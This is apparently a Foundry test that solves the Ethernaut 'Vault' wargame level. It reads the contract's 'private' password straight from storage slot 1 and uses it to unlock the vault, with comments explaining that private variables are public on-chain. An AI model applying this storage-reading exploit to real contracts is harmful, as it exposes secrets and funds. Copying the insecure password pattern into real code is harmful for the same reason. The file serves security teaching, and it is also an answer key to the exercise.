// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/08-Vault/VaultFactory.sol";
import "../core/Ethernaut.sol";

contract VaultTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testVaultHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // password has a visibility set to private
        // which means not accessible from other contracts
        // BUT the information is public on the blockchain
        // see https://docs.soliditylang.org/en/develop/contracts.html#state-variable-visibility
        // Hence, it possible to retrieve it
        // By looking at the Vault contract: password is located at slot 1 in storage
        // vm.load can be used to retrieve storage slot value in Foundry

        bytes32 password = vm.load(address(ethernautVault), bytes32(uint256(1)));
        ethernautVault.unlock(password);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
